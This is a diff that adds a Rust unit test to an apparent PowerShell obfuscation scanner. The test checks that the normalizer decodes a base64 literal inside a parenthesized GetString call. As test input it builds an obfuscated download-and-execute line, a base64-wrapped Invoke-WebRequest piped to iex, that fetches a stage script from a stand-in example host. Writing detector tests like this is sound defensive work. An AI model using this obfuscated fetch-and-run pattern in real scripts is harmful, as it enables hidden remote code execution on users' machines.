@@ -8600,6 +8600,28 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_normalization_decodes_parenthesized_getstring_base64_literal() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-lit-paren.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(('{b64}'))) | iex"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-lit-paren.example/stage.ps1"),
+            "parenthesized base64 literal script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String(('"),
+            "parenthesized base64 literal GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_byte_array_getstring() {
         let bytes = "https://byte-array.example/stage.ps1"
             .bytes()
